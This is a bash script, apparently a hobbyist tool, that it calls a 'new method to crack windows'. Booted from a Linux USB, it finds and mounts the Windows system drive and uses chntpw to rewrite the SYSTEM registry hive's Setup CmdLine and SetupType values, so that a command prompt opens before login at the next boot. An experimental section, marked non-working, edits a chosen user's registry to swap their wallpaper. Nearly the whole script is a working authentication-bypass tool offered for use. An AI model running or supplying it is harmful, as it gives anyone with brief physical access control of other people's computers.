# new method to crack windows
# this one requires a non-windows bootable usb (I used puppy linux)

# it includes some other (experimental) stuff, like changing the wallpaper.
# running the script without options should work though.
# this will locate the C: drive and change the registry to start a cmd at the next boot (once)


# sudo
if [[ $UID != 0 ]]; then
    echo "Please run this script with sudo:"
    echo "sudo ./$0 $*"
    exit 1
fi

# allow flags
while getopts “d:hnpwku:” opt; do
  case $opt in
    d) device=$OPTARG ;; #;; use device (-d)
    h) echo "E.g. ./$0 -d sda1 -nwp"; exit ;; # help
    n) nohack=1 ;; # don't hack registry
    p) passwords=1 ;;
    w) wallpaper=1 ;;
    k) keepopen=1 ;;
    u) usertarget=$OPTARG ;;
  esac
done

# if -d
mkdir /media/final -p
timeout=1
if [ "$device" ]; then
    echo "yes, using $device"
    mount /dev/$device /media/final
else
# else
    # read -p "Do you already know which /dev/ to use? " device
	# disable this option for now because its faster
    mkdir /media/tests -p

    tmpfile=`mktemp`
# if nothing entered
    if [ -z "$device" ]; then
    echo 'scanning'
# check all windows stuff, find Windows/System32
    for i in $(fdisk -l | grep 'Microsoft basic data' | cut -f1 -d' '); do
        device=`echo $i | cut -d/ -f3`
        mkdir /media/tests/$device -p
        echo -n "."
        mount /dev/$device /media/tests/$device
        echo -n "."
        if [ -d "/media/tests/$device/Windows/System32" ]; then
            echo -n "."
            echo $device > $tmpfile
        fi
        sleep $timeout
        echo -n "."
        umount /media/tests/$device 2> /dev/null
        echo -n "."
        sleep $timeout
        echo -n "."
        rmdir /media/tests/$device 2> /dev/null
    done

    echo
    echo 'scanning done. results:'
    echo


    res=`cat $tmpfile | wc -l`
# let the user choose (or auto choose)
    if [ "$res" -gt "1" ]; then
        echo 'multiple results. please choose one:'


    select device in `cat $tmpfile`;
    do
        if [[ -z "$device" ]]; then
            echo
        else
            # done, picked a device
            break
        fi
    done


        cat $tmpfile;
    elif [ "$res" -gt "0" ]; then
        device=`cat $tmpfile`
        echo "one result. Using $device"
    else
        echo 'no results, please look for yourself and try again'
        exit
    fi

    mount /dev/$device /media/final

    else
    mount /dev/$device /media/final
    fi

fi
# end of start-up
if [ -z "$nohack" ]; then
    cd /media/final/Windows/System32/config

# actual hack:
    (cat <<EOF
cd Setup
ed CmdLine
cmd.exe
ed SetupType
2
q
y

EOF
) | chntpw -e SYSTEM
fi

function getuser {
    if [ -z "$usertarget" ]; then
    cd /media/final/Users

    select usertarget in `ls | grep -v -e 'All Users' -e 'Default' -e 'Public' -e 'desktop\.ini' -i`;
    do
        if [[ -z "$usertarget" ]]; then
            echo
        else
            # done, picked a target
            break
        fi
    done


    fi
}

function wait_with_dot {
for i in {0..5}
do
    echo -n "."
    sleep 1
done
echo
}

## EXPERIMENTAL ZONE, THIS DOES NOT WORK AT ALL!

if [ "$passwords" ]; then
    getuser
    echo "Editing $usertarget"
# TODO
fi
# TODO: curl/copy
if [ "$wallpaper" ]; then 
# NOTE: currently not working (properly), use the .bat windows version.
    getuser
(cat <<EOF
cd \Software\Microsoft\Internet Explorer\Desktop\General
ed WallpaperSource
C:\\Users\\$usertarget\\Pictures\\hack.jpg
cd \Control Panel\Desktop
ed WallPaper
C:\\Users\\$usertarget\\Pictures\\hack.jpg
q
y
EOF
) | chntpw /media/final/Users/$usertarget/NTUSER.DAT -e


    echo "hacking wallpaper of $usertarget"
# TODO
fi
# close down
if [ -z "$keepopen" ]; then
echo 'shutting mount off'
wait_with_dot
umount /media/final
sleep 10
rmdir /media/final
echo 'done'
fi
poweroff

